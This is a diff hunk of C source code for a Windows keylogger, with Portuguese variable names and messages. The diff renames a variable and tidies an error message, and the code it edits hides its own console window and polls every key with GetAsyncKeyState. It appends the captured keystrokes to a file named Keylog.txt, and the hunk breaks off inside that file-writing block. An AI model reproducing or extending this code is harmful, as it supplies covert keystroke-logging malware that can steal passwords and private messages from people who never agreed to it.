@@ -5,24 +5,25 @@
 #include <windows.h>  
  
 int main() {
-    short i;
-    short keyState;
+    
     HWND hidden;
     AllocConsole();
     hidden = FindWindow("ConsoleWindowClass", NULL);
     ShowWindow(hidden, 0);
+    short i;
+    short pegarTecla;
     bool rodar = true;
  
     while(rodar == true) {
         for(i = 0; i <= 255; i++) {
-            keyState = GetAsyncKeyState(i);
-            if(keyState == -32767) {
+            pegarTecla = GetAsyncKeyState(i);
+            if(pegarTecla == -32767) {
                 Sleep(30);
                 FILE *file;
                 file = fopen("Keylog.txt", "a+");
  
                 if(file == NULL) {
-                    printf("Erro ao criar o Arquivo Keylog.txt.\n");
+                    printf("Erro ao criar Keylog.txt.\n");
                     exit(1);
                 }
  
